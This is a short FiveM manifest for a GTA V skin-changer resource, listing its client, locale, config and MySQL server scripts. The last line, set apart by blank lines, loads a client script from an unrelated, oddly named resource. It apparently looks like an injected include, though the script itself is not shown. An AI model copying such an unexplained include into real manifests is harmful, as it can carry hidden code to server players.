fx_version "bodacious"
games {"gta5"}
description 'Skin Changer'

version '1.0.3'

client_scripts {
	'locale.lua',
	'locales/space.lua',
	'config.lua',
	'client/main.lua'
}

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'server.lua'
}


client_script '@pozdoodtajczyka/client/main.lua'